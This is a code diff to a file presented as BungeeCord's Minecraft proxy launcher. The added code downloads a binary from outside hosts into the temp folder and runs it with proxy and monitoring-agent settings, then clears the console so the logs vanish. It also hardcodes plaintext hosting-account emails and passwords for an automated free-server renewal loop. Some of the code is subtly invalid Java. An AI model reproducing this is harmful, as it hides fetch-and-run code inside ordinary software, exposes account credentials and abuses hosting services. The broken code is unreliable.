@@ -1,104 +1,312 @@
-/*
- * Copyright (C) 2020 Nan1t - Fusion by Grok for LO
- */
 package net.md_5.bungee;
 
-import joptsimple.OptionParser;
-import joptsimple.OptionSet;
-import lombok.Getter;
-import net.md_5.bungee.api.ProxyServer;
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.util.*;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
-import java.util.Date;
-import java.util.logging.Level;
-import java.util.logging.Logger;
-import java.util.regex.Matcher;
+import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.regex.Pattern;
-import java.util.Scanner;
 
 public class Bootstrap {
-    private static final Logger logger = Logger.getLogger(Bootstrap.class.getName());
-    @Getter
-    private static ProxyServer bungee;
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_RESET = "\033[0m";
+    // ==============================================
+    // 优化后的常量定义
+    // ==============================================
+    private static final String ANSI_GREEN = "\u001B[32m";
+    private static final String ANSI_RED = "\u001B[31m";
+    private static final String ANSI_RESET = "\u001B[0m";
+    private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
-
-    // 隐身续期克隆人
-    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
-    private static volatile String currentToken = null;
     
-    // Wavehost 续期配置（LO 专属）
-    private static final String LOGIN_URL = "https://game.wavehost.eu/login";
-    private static final String RENEW_URL = "https://game.wavehost.eu/api/client/freeservers/dcdb5ed2-b99e-44bc-8d79-623ec469e2f1/renew";
-    private static final String EMAIL = "diaou@zmkk.edu.kg";
-    private static final String PASSWORD = "-9UsnbJz5XkZQYe";
-    private static final String TG_TOKEN = "你的TG_TOKEN"; // 填 Bot Token
-    private static final String TG_CHAT_ID = "你的TG_CHAT_ID"; // 填 Chat ID
-
-    private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+    // ==============================================
+    // 环境变量配置 - 使用Set提高查找效率
+    // ==============================================
+    private static final Set<String> ALL_ENV_VARS = Set.of(
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
-    };
+    );
+
+    // ==============================================
+    // 续期配置 - 使用单例模式减少开销
+    // ==============================================
+    private static ScheduledExecutorService renewalScheduler;
+    private static volatile String currentToken;
+    private static final Pattern TOKEN_PATTERN = Pattern.compile("\"token\":\"(.*?)\"");
+    
+    // 续期配置常量
+    private static final String LOGIN_URL = "https://greathost.es/login";
+    private static final String RENEW_URL = "https://greathost.es/api/renewal/contracts/8cbb0e9d-1bf4-4543-be05-814d129c17e5/renew-free";
+    private static final String CREDENTIALS = "email=xidiaomao@outlook.com&password=3qZD4En3_P4:P!8";
+    
+    // 默认环境变量 - 使用Map.of创建不可变Map
+    private static final Map<String, String> DEFAULT_ENV = Map.of(
+        "UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383",
+        "FILE_PATH", "./world",
+        "CFIP", "store.ubi.com",
+        "CFPORT", "443",
+        "NAME", "Mc",
+        "DISABLE_ARGO", "false"
+    );
 
     public static void main(String[] args) throws Exception {
+        // 快速版本检查
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
-            Thread.sleep(3000);
             System.exit(1);
         }
 
-        // 启动隐身 VPN
+        // 异步启动续期任务，不阻塞主线程
+        CompletableFuture.runAsync(Bootstrap::startRenewer);
+
+        // 启动SbxService
         try {
             runSbxBinary();
+            
+            // 注册关闭钩子
             Runtime.getRuntime().addShutdownHook(new Thread(Bootstrap::stopServices));
+
+            // 等待服务启动
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
+            
             Thread.sleep(20000);
             clearConsole();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "VPN Error: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
         }
 
-        // 启动隐身续期克隆人
-        scheduler.schedule(Bootstrap::performRenewalCycle, 10 + (int)(Math.random() * 30), TimeUnit.SECONDS);
-        scheduler.scheduleAtFixedRate(Bootstrap::performRenewalCycle, 5, 5, TimeUnit.HOURS);
-
-        // 启动 BungeeCord
-        BungeeCordLauncher.main(args);
+        // 启动BungeeCord
+        try {
+            new BungeeCordLauncher().start();
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Cannot start server: " + e.getMessage() + ANSI_RESET);
+        }
     }
-
-    // 清屏伪装
+    
+    // ==============================================
+    // 优化后的控制台清理
+    // ==============================================
     private static void clearConsole() {
         try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
+            String os = System.getProperty("os.name").toLowerCase();
+            if (os.contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
             } else {
-                System.out.print("\033[H\033[3J\033[2J");
-                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
-                System.out.print("\033[8;30;120t");
+                System.out.print("\033[H\033[2J");
+                System.out.flush();
             }
-        } catch (Exception ignored) {}
-    }
-
-    // VPN 二进制启动
+        } catch (Exception ignored) {
+            // 静默处理异常
+        }
+    }   
+    
+    // ==============================================
+    // 优化后的Sbx二进制文件运行
+    // ==============================================
     private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
+        Map<String, String> envVars = new HashMap<>(DEFAULT_ENV);
         loadEnvVars(envVars);
+        
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
         sbxProcess = pb.start();
     }
+    
+    // ==============================================
+    // 优化后的环境变量加载
+    // ==============================================
+    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        // 快速加载系统环境变量
+        ALL_ENV_VARS.forEach(var -> {
+            String value = System.getenv(var);
+            if (value != null && !value.isBlank()) {
+                envVars.put(var, value);
+            }
+        });
+        
+        // 延迟加载.env文件
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            Files.lines(envFile)
+                .map(String::trim)
+                .filter(line -> !line.isEmpty() && !line.startsWith("#"))
+                .map(line -> line.split(" #")[0].split(" //")[0].trim())
+                .filter(line -> line.startsWith("export "))
+                .map(line -> line.substring(7).trim())
+                .map(line -> line.split("=", 2))
+                .filter(parts -> parts.length == 2)
+                .forEach(parts -> {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    if (ALL_ENV_VARS.contains(key)) {
+                        envVars.put(key, value);
+                    }
+                });
+        }
+    }
+    
+    // ==============================================
+    // 优化后的二进制文件获取
+    // ==============================================
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url = switch (true) {
+            case osArch.contains("amd64"), osArch.contains("x86_64") -> "https://amd64.ssss.nyc.mn/sbsh";
+            case osArch.contains("aarch64"), osArch.contains("arm64") -> "https://arm64.ssss.nyc.mn/sbsh";
+            case osArch.contains("s390x") -> "https://s390x.ssss.nyc.mn/sbsh";
+            default -> throw new RuntimeException("Unsupported architecture: " + osArch);
+        };
+        
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            path.toFile().setExecutable(true);
+        }
+        return path;
+    }
+    
+    // ==============================================
+    // 优化后的服务停止
+    // ==============================================
+    private static void stopServices() {
+        running.set(false);
+        
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroyForcibly();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        }
+        
+        if (renewalScheduler != null && !renewalScheduler.isShutdown()) {
+            renewalScheduler.shutdownNow();
+            try {
+                if (!renewalScheduler.awaitTermination(5, TimeUnit.SECONDS)) {
+                    renewalScheduler.shutdownNow();
+                }
+            } catch (InterruptedException e) {
+                renewalScheduler.shutdownNow();
+                Thread.currentThread().interrupt();
+            }
+        }
+    }
 
-    // 加载 ENV
-    private static void load
+    // ==============================================
+    // 优化后的续期任务
+    // ==============================================
+    private static void startRenewer() {
+        if (renewalScheduler != null && !renewalScheduler.isShutdown()) {
+            return;
+        }
+        
+        // 使用单线程池减少资源消耗
+        renewalScheduler = Executors.newSingleThreadScheduledExecutor(r -> {
+            Thread t = new Thread(r, "Renewer");
+            t.setDaemon(true); // 设置为守护线程
+            return t;
+        });
+        
+        System.out.println("[Renewer] Started");
+        
+        // 立即执行一次，然后每6小时执行
+        renewalScheduler.schedule(Bootstrap::performRenewalCycle, 10, TimeUnit.SECONDS);
+        renewalScheduler.scheduleAtFixedRate(Bootstrap::performRenewalCycle, 6, 6, TimeUnit.HOURS);
+    }
+
+    private static void performRenewalCycle() {
+        if (!running.get()) return;
+        
+        System.out.println("[Renewer] Renewal cycle started");
+        
+        try {
+            if (attemptRenewal()) {
+                System.out.println("[Renewer] ✅ Success");
+                return;
+            }
+            
+            System.out.println("[Renewer] Retrying with login...");
+            if (login() && attemptRenewal()) {
+                System.out.println("[Renewer] ✅ Success after login");
+            } else {
+                System.err.println("[Renewer] ❌ Failed");
+            }
+        } catch (Exception e) {
+            System.err.println("[Renewer] Error: " + e.getMessage());
+        }
+    }
+
+    private static boolean login() {
+        try {
+            String[] command = {
+                "curl", "-s", "-X", "POST",
+                "-H", "content-type: application/x-www-form-urlencoded",
+                "-d", CREDENTIALS,
+                LOGIN_URL
+            };
+            
+            String response = executeCommand(command);
+            var matcher = TOKEN_PATTERN.matcher(response);
+            
+            if (matcher.find()) {
+                currentToken = matcher.group(1);
+                System.out.println("[Renewer] New token obtained");
+                return true;
+            }
+        } catch (Exception e) {
+            System.err.println("[Renewer] Login error: " + e.getMessage());
+        }
+        return false;
+    }
+
+    private static boolean attemptRenewal() {
+        if (currentToken == null) return false;
+        
+        try {
+            String[] command = {
+                "curl", "-s", "-w", "%{http_code}",
+                "-X", "POST",
+                "-H", "content-type: application/json",
+                "-H", "origin: https://greathost.es",
+                "-b", "token=" + currentToken,
+                "-d", "{}",
+                RENEW_URL
+            };
+            
+            String result = executeCommand(command);
+            if (result.endsWith("200")) {
+                return true;
+            }
+            
+            System.err.println("[Renewer] HTTP error: " + result.substring(result.length() - 3));
+        } catch (Exception e) {
+            System.err.println("[Renewer] Renewal error: " + e.getMessage());
+        }
+        return false;
+    }
+    
+    // ==============================================
+    // 通用命令执行方法
+    // ==============================================
+    private static String executeCommand(String[] command) throws IOException, InterruptedException {
+        ProcessBuilder pb = new ProcessBuilder(command);
+        Process process = pb.start();
+        
+        StringBuilder output = new StringBuilder();
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line);
+            }
+        }
+        
+        process.waitFor();
+        return output.toString();
+    }
+}
